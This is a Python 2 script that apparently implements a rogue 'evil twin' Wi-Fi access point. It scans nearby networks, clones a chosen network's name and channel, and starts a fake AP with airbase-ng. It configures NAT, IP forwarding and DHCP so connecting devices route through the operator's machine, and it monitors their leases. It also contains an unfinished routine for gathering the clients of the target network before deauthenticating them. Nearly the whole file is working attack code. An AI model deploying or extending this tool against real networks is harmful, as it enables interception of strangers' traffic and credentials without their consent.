#!/usr/bin/env python

import os
from subprocess import Popen, PIPE
import time
import sys
import re
import signal
import argparse
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *
conf.verb = 0
from multiprocessing import Process
from threading import Thread, Lock
import socket
import struct
import fcntl

# Console colors
W  = '\033[0m'  # white (normal)
R  = '\033[31m' # red
G  = '\033[32m' # green
O  = '\033[33m' # orange
B  = '\033[34m' # blue
P  = '\033[35m' # purple
C  = '\033[36m' # cyan
GR = '\033[37m' # gray
T  = '\033[93m' # tan

DN = open(os.devnull, 'w')
APs = {}
chan = 0 # for channel hopping Process
count = 0
forw = '0\n'
lock = Lock()
ap_mac = '' # for sniff's cb function
mon_mac1 = '' # for deauth sniff's cb
mon_mac2 = '' # for deauth sniff's cb
clients = [] # for deauth sniff's cb

def parse_args():
    #Create the arguments
    parser = argparse.ArgumentParser()
    parser.add_argument("-c", "--channel", help="Choose the channel for the fake AP. Default is channel 6.")
    parser.add_argument("-e", "--essid", help="Choose the ESSID for the fake AP. Default is 'Free Wifi'. Wrap in quotes if it is more than 1 word: -e 'Free Wifi'")
    parser.add_argument("-t", "--targeting", help="Will print a list of APs in range", action="store_true")
    return parser.parse_args()


########################
# AP TARGETING & DEAUTH
########################

def target_APs():
    os.system('clear')
    print '['+T+'*'+W+'] If channel hopping is not working disconnect the monitor mode parent interface (like wlan1) from the network it is on'
    print 'num  ch   ESSID'
    print '---------------'
    for ap in APs:
        print G+str(ap).ljust(2)+W+' - '+APs[ap][0].ljust(2)+' - '+T+APs[ap][1]+W

def channel_hop(mon_iface):
    global chan
    while 1:
        try:
            if chan > 11:
                chan = 0
            chan = chan+1
            channel = str(chan)
            Popen(['iw', 'dev', mon_iface, 'set', 'channel', channel], stdout=DN, stderr=DN)
            time.sleep(2)
        except KeyboardInterrupt:
            sys.exit()

def copy_AP(inet_iface, interfaces, args):
    copy = None
    while not copy:
        try:
            copy = raw_input('\n['+G+'+'+W+'] Choose the ['+G+'num'+W+'] of the AP you wish to copy: ')
            copy = int(copy)
        except Exception:
            copy = None
            continue
    channel = APs[copy][0]
    essid = APs[copy][1]
    mac = APs[copy][2]
    return channel, essid, mac

def deauth_cb(pkt):
    global clients, mon_mac2
    if pkt.haslayer(Dot11):
        if pkt.type in [1,2] and pkt.addr1 and pkt.addr2: # 1 management, 2 data

            if pkt.addr1 == ap_mac or pkt.addr2 == ap_mac:
                print pkt.addr1, pkt.addr2

            ignore = ['ff:ff:ff:ff:ff:ff', '00:00:00:00:00:00', '33:33:00:', '33:33:ff:', '01:80:c2:00:00:00', '01:00:5e:', mon_mac1, mon_mac2]
            for i in ignore:
                if i in pkt.addr1 or i in pkt.addr2:
                    return

            if pkt.addr1 == ap_mac:
                for c in clients:
                    if pkt.addr2 == c:
                        return
                with lock:
                    clients.append(pkt.addr2)
            elif pkt.addr2 == ap_mac:
                for c in clients:
                    if pkt.addr1 == c:
                        return
                with lock:
                    clients.append(pkt.addr1)
#    print clients


def target_deauth(inet_iface, interfaces, essid, ap_mac, channel):
    global mon_mac2
    yn = raw_input('['+G+'+'+W+'] Deauthenticate clients on '+T+essid+W+' at '+T+ap_mac+W+'? [y/n]: ')
    if yn == 'y':
        for i in interfaces:
            if inet_iface == i:
                mon_iface2 = start_monitor(i, channel)
                mon_mac2 = get_mon_mac(mon_iface2)
                print '['+T+'*'+W+'] Started '+T+mon_iface2+W+' on '+T+mon_mac2+W+' for deauthentication'
                break

        #dcb = deauth_cb
        s = Thread(target=sniffing, args=(mon_iface2, deauth_cb))
        s.daemon = True
        s.start()

#        thread here ##########################################################

def targeting_cb(pkt):
    """Callback for the first sniff() targeting"""
    global APs, count
    if pkt.haslayer(Dot11Beacon) or pkt.haslayer(Dot11ProbeResp):
        try:
            ap_channel = str(ord(pkt[Dot11Elt:3].info))
        except Exception:
            return
        essid = pkt[Dot11Elt].info
        mac = pkt[Dot11].addr2
        if len(APs) > 0:
            for num in APs:
                if essid in APs[num][1]:
                    return
        count += 1
        APs[count] = [ap_channel, essid, mac]
        target_APs()

def deauth_pkt(pkt):
    pass


####################################
# END AP TARGETING & DEAUTH
####################################


def iwconfig():
    monitors = []
    interfaces = {}
    proc = Popen(['iwconfig'], stdout=PIPE, stderr=DN)
    for line in proc.communicate()[0].split('\n'):
        if len(line) == 0: continue # Isn't an empty string
        if line[0] != ' ': # Doesn't start with space
            ignore_iface = re.search('eth[0-9]|em[0-9]|p[1-9]p[1-9]|at[0-9]', line)
            if not ignore_iface: # Isn't wired or at0 tunnel
                iface = line[:line.find(' ')] # is the interface name
                if 'Mode:Monitor' in line:
                    monitors.append(iface)
                elif 'IEEE 802.11' in line:
                    if "ESSID:\"" in line:
                        interfaces[iface] = 1
                    else:
                        interfaces[iface] = 0
#    if len(interfaces) < 2:
#        sys.exit('[-] You need at least 2 wireless interfaces. Please bring 2 up and retry.')
    return monitors, interfaces

def rm_mon():
    monitors, interfaces = iwconfig()
    for m in monitors:
        if 'mon' in m:
            Popen(['airmon-ng', 'stop', m], stdout=DN, stderr=DN)
        else:
            Popen(['ifconfig', m, 'down'], stdout=DN, stderr=DN)
            Popen(['iw', 'dev', m, 'mode', 'managed'], stdout=DN, stderr=DN)
            Popen(['ifconfig', m, 'up'], stdout=DN, stderr=DN)

def internet_info(interfaces):
    inet_iface = None
    proc = Popen(['/sbin/ip', 'route'], stdout=PIPE, stderr=DN)
    def_route = proc.communicate()[0].split('\n')#[0].split()
    for line in def_route:
        if 'default via' in line:
            line = line.split()
            inet_iface = line[4]
            ipprefix = line[2][:2] # Just checking if it's 192, 172, or 10
    if inet_iface:
        return inet_iface, ipprefix
    else:
        sys.exit('['+R+'!'+W+'] No active internet connection found, exiting')

def AP_iface(interfaces, inet_iface):
    for i in interfaces:
        if i != inet_iface:
            return i

def iptables(inet_iface):
    global forw
    print '['+T+'*'+W+'] Setting up iptables'
    os.system('iptables -X')
    os.system('iptables -F')
    os.system('iptables -t nat -F')
    os.system('iptables -t nat -X')
    os.system('iptables -t nat -A POSTROUTING -o %s -j MASQUERADE' % inet_iface)
    with open('/proc/sys/net/ipv4/ip_forward', 'r+') as ipf:
        forw = ipf.read()
        ipf.write('1\n')
        print '['+T+'*'+W+'] Enabled IP forwarding'
        return forw

def start_monitor(ap_iface, channel):
    proc = Popen(['airmon-ng', 'start', ap_iface, channel], stdout=PIPE, stderr=DN)
    for line in proc.communicate()[0].split('\n'):
        if "monitor mode enabled" in line:
            line = line.split()
            mon_iface = line[4][:-1]
            return mon_iface

def get_mon_mac(mon_iface):
    '''
    http://stackoverflow.com/questions/159137/getting-mac-address
    '''
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    info = fcntl.ioctl(s.fileno(), 0x8927, struct.pack('256s', mon_iface[:15]))
    mac = ''.join(['%02x:' % ord(char) for char in info[18:24]])[:-1]
#    print '['+G+'*'+W+'] Monitor mode: '+G+mon_iface+W+' - '+O+mac+W
    return mac

def start_ap(mon_iface, channel, essid):
    Popen(['airbase-ng', '-c', channel, '-e', essid, '-v', mon_iface], stdout=DN, stderr=DN)
    try:
        time.sleep(6) # Copied from Pwnstar which said it was necessary?
    except KeyboardInterrupt:
        cleanup(None, None)
    Popen(['ifconfig', 'at0', 'up', '10.0.0.1', 'netmask', '255.255.255.0'], stdout=DN, stderr=DN)
    Popen(['ifconfig', 'at0', 'mtu', '1400'], stdout=DN, stderr=DN)

def sniffing(interface, cb):
    sniff(iface=interface, prn=cb, store=0)

def dhcp_conf(ipprefix):
    config = ('default-lease-time 300;\n'
              'max-lease-time 360;\n'
              'ddns-update-style none;\n'
              'authoritative;\n'
              'log-facility local7;\n'
              'subnet %s netmask 255.255.255.0 {\n'
              'range %s;\n'
              'option routers %s;\n'
              'option domain-name-servers %s;\n'
              '}')
    if ipprefix == '19' or ipprefix == '17':
        with open('/tmp/dhcpd.conf', 'w') as dhcpconf:
            # subnet, range, router, dns
            dhcpconf.write(config % ('10.0.0.0', '10.0.0.2 10.0.0.100', '10.0.0.1', '8.8.8.8'))
    elif ipprefix == '10':
        with open('/tmp/dhcpd.conf', 'w') as dhcpconf:
            dhcpconf.write(config % ('172.16.0.0', '172.16.0.2 172.16.0.100', '172.16.0.1', '8.8.8.8'))
    return '/tmp/dhcpd.conf'

def dhcp(dhcpconf, ipprefix):
    #print '['+T+'*'+W+'] Clearing leases and starting DHCP'
    os.system('echo > /var/lib/dhcp/dhcpd.leases')
    dhcp = Popen(['dhcpd', '-cf', dhcpconf], stdout=PIPE, stderr=DN)
    if ipprefix == '19' or ipprefix == '17':
        os.system('route add -net 10.0.0.0 netmask 255.255.255.0 gw 10.0.0.1')
    else:
        os.system('route add -net 172.16.0.0 netmask 255.255.255.0 gw 172.16.0.1')

def mon_mac(mon_iface):
    '''
    http://stackoverflow.com/questions/159137/getting-mac-address
    '''
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    info = fcntl.ioctl(s.fileno(), 0x8927, struct.pack('256s', mon_iface[:15]))
    mac = ''.join(['%02x:' % ord(char) for char in info[18:24]])[:-1]
    return mac

def cleanup(signal, frame):
    global forw
    print '\n['+R+'!'+W+'] Clearing iptables and turning off IP forwarding...'
    with open('/proc/sys/net/ipv4/ip_forward', 'r+') as forward:
        forward.write(forw)
    os.system('iptables -F')
    os.system('iptables -X')
    os.system('iptables -t nat -F')
    os.system('iptables -t nat -X')
    os.system('pkill airbase-ng')
    os.system('pkill dhcpd') # Dangerous?
    rm_mon()
#    os.system('ifconfig at0 down')
    sys.exit(0)

def main(args):
    global ipf, mon_iface, ap_mac, mon_mac1
    channel = '1'
    if args.channel:
        channel = args.channel
    essid = 'Free Wifi'
    if args.essid:
        essid = args.essid

    monitors, interfaces = iwconfig()
    if len(interfaces) < 2:
        sys.exit('[-] You need at least 2 wireless interfaces. Please bring 2 up and retry.')
    rm_mon()
    inet_iface, ipprefix = internet_info(interfaces)
    ap_iface = AP_iface(interfaces, inet_iface)
    ipf = iptables(inet_iface)
    mon_iface = start_monitor(ap_iface, channel)
    mon_mac1 = get_mon_mac(mon_iface)
    if args.targeting:
        hop = Process(target=channel_hop, args=(mon_iface,))
        hop.start()
        tcb = targeting_cb
        sniffing(mon_iface, tcb)
        hop.terminate()
        channel, essid, ap_mac = copy_AP(inet_iface, interfaces, args) # these 2 args are for target_deauth()
        target_deauth(inet_iface, interfaces, essid, ap_mac, channel)
    start_ap(mon_iface, channel, essid)
    dhcpconf = dhcp_conf(ipprefix)
    dhcp(dhcpconf, ipprefix)
    signal.signal(signal.SIGINT, cleanup)
    while 1:
        os.system('clear')
        print '['+T+'*'+W+'] '+T+essid+W+' set up on channel '+T+channel+W
        print '    DHCP leases:\n'
        proc = Popen(['cat', '/var/lib/dhcp/dhcpd.leases'], stdout=PIPE, stderr=DN)
        for line in proc.communicate()[0].split('\n'):
            print line
        time.sleep(2)

main(parse_args())
